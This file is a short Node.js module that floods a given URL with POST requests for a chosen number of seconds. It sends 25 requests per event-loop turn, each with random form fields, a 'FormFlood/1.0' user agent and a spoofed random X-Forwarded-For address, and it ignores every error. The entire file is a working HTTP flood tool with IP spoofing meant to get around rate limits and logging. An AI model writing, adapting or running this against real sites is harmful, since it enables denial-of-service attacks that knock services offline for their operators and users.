
const http = require("http");
const https = require("https");
const { URL } = require("url");

function fakeIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join(".");
}

function fakeForm() {
  return `field1=${Math.random().toString(36)}&field2=${Math.random().toString(36)}`;
}

module.exports = function (target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const body = fakeForm();
    const options = {
      method: "POST",
      hostname: url.hostname,
      path: url.pathname || "/",
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": Buffer.byteLength(body),
        "User-Agent": "FormFlood/1.0",
        "X-Forwarded-For": fakeIP()
      }
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] from ${url.hostname} using POST`);
      res.on("data", () => {});
    });
    req.on("error", () => {});
    req.write(body);
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 25; i++) send();
    setImmediate(loop);
  }

  loop();
};
